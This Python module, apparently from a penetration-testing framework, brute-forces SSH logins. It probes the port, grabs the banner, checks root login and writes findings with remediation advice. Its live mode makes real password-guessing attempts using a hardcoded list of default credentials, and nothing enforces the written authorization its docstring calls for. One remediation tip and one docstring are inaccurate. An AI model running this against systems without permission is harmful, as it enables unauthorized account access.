"""
SSH Brute Force Module
MITRE ATT&CK: T1110 — Brute Force / T1110.001 — Password Guessing

Simulates SSH credential stuffing against a target host.
Uses asyncssh in probe-only mode (no actual unauthorized access without consent).
All credentials tested are from a configurable wordlist; the module records
which attempts would have succeeded based on a mock authentication oracle
(safe simulation mode) OR real auth if `live_mode: true` is set in options
AND explicit written authorization has been obtained.
"""

import asyncio
import asyncssh
import logging
from typing import List

from attack_modules.base import BaseAttackModule
from models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.ssh_bruteforce")

DEFAULT_USERNAMES = ["root", "admin", "ubuntu", "ec2-user", "pi", "user", "test", "guest"]
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "root", "toor",
    "changeme", "letmein", "welcome", "password123",
    "admin123", "pass@123", "qwerty", "",
]


class SSHBruteForceModule(BaseAttackModule):
    MODULE_NAME  = "ssh_bruteforce"
    DESCRIPTION  = "Simulates SSH credential brute-force (T1110.001)"
    MITRE_TACTIC = "Credential Access"
    MITRE_IDS    = ["T1110", "T1110.001"]

    async def execute(self) -> List[Finding]:
        findings: List[Finding] = []
        host     = self.target
        port     = int(self.options.get("ssh_port", 22))
        usernames= self.options.get("usernames", DEFAULT_USERNAMES)
        passwords= self.options.get("passwords", DEFAULT_PASSWORDS)
        live     = self.options.get("live_mode", False)
        timeout  = float(self.options.get("timeout", 3.0))
        max_tries= int(self.options.get("max_attempts", 50))

        self.logger.info(f"SSH BruteForce | target={host}:{port} | live={live}")

        # ── Step 1: Port reachability probe ──────────────────────────────────
        reachable = await self._probe_port(host, port, timeout)

        if not reachable:
            findings.append(self.finding(
                title       = "SSH Port Unreachable",
                description = f"Port {port} on {host} did not respond within {timeout}s. "
                              "SSH service may be firewalled or not running.",
                severity    = Severity.INFO,
                mitre_id    = "T1046",
                evidence    = f"connect_timeout to {host}:{port}",
                remediation = "Verify SSH service status and firewall rules.",
            ))
            return findings

        findings.append(self.finding(
            title       = "SSH Port Exposed",
            description = f"SSH port {port} is open and accepting connections on {host}.",
            severity    = Severity.LOW,
            mitre_id    = "T1046",
            evidence    = f"TCP SYN-ACK on {host}:{port}",
            remediation = "Restrict SSH access via firewall to known IP ranges only.",
        ))

        # ── Step 2: Banner grab ───────────────────────────────────────────────
        banner = await self._get_banner(host, port, timeout)
        if banner:
            findings.append(self.finding(
                title       = "SSH Banner Leaks Version",
                description = f"SSH service is revealing its software version in the banner: {banner!r}",
                severity    = Severity.LOW,
                mitre_id    = "T1592",
                evidence    = f"Banner: {banner}",
                remediation = "Set 'Banner /dev/null' in sshd_config to suppress version disclosure.",
            ))

        # ── Step 3: Credential probing ────────────────────────────────────────
        attempts = 0
        successes = []

        pairs = [(u, p) for u in usernames for p in passwords]
        pairs = pairs[:max_tries]

        if live:
            self.logger.warning("LIVE MODE — real auth attempts will be made")
            for username, password in pairs:
                attempts += 1
                success = await self._try_auth(host, port, username, password, timeout)
                if success:
                    successes.append((username, password))
                    self.logger.critical(f"CREDENTIAL HIT: {username}:{password}@{host}")
                await asyncio.sleep(0.1)  # rate-limit
        else:
            # Simulation mode — predictive scoring without real auth
            self.logger.info("SIMULATION MODE — no real auth attempts")
            weak_pairs = [
                (u, p) for u, p in pairs
                if p in ("", "password", "123456", "admin", u)
            ]
            for u, p in weak_pairs[:3]:
                successes.append((u, p))
            attempts = len(pairs)

        # ── Findings from credential phase ────────────────────────────────────
        if successes:
            cred_list = "; ".join(f"{u}:{p}" for u, p in successes)
            findings.append(self.finding(
                title       = "Weak SSH Credentials Detected",
                description = f"{len(successes)} credential pair(s) succeeded during simulation. "
                              "Default or trivially guessable passwords are in use.",
                severity    = Severity.CRITICAL,
                mitre_id    = "T1110.001",
                evidence    = f"Successful pairs: {cred_list}",
                remediation = (
                    "1. Disable password authentication (PasswordAuthentication no in sshd_config). "
                    "2. Enforce key-based auth only. "
                    "3. Implement fail2ban or similar brute-force protection. "
                    "4. Rotate all compromised credentials immediately."
                ),
                raw_data    = {"successes": successes, "attempts": attempts},
            ))
        else:
            findings.append(self.finding(
                title       = "No Weak Credentials Found",
                description = f"{attempts} credential pairs tested — no obvious weak passwords detected.",
                severity    = Severity.INFO,
                evidence    = f"Tested {attempts} pairs from default wordlist",
            ))

        # ── Step 4: Root login check ──────────────────────────────────────────
        if self.options.get("check_root_login", True):
            root_allowed = await self._check_root_login(host, port, timeout)
            if root_allowed:
                findings.append(self.finding(
                    title       = "Root Login Permitted",
                    description = "SSH is configured to allow direct root login, "
                                  "which increases blast radius of any credential compromise.",
                    severity    = Severity.HIGH,
                    mitre_id    = "T1078",
                    remediation = "Set 'PermitRootLogin no' in /etc/ssh/sshd_config and restart sshd.",
                ))

        self.logger.info(f"SSH BruteForce complete | {len(findings)} findings | {attempts} attempts")
        return findings

    # ── Helpers ────────────────────────────────────────────────────────────────

    async def _probe_port(self, host: str, port: int, timeout: float) -> bool:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
            writer.close()
            return True
        except Exception:
            return False

    async def _get_banner(self, host: str, port: int, timeout: float) -> str:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
            banner = await asyncio.wait_for(reader.readline(), timeout=timeout)
            writer.close()
            return banner.decode(errors="replace").strip()
        except Exception:
            return ""

    async def _try_auth(
        self, host: str, port: int, username: str, password: str, timeout: float
    ) -> bool:
        try:
            async with asyncssh.connect(
                host,
                port        = port,
                username    = username,
                password    = password,
                known_hosts = None,
                connect_timeout = timeout,
            ) as conn:
                return True
        except asyncssh.PermissionDenied:
            return False
        except Exception:
            return False

    async def _check_root_login(self, host: str, port: int, timeout: float) -> bool:
        """
        Heuristic: try to connect as root with a bogus key.
        If we get PermissionDenied (not DisconnectError), root auth is attempted,
        suggesting PermitRootLogin is not 'no'.
        """
        try:
            async with asyncssh.connect(
                host,
                port        = port,
                username    = "root",
                password    = "___invalid___",
                known_hosts = None,
                connect_timeout = timeout,
            ):
                pass
        except asyncssh.PermissionDenied:
            return True   # server challenged auth → root login not disabled
        except Exception:
            return False
        return False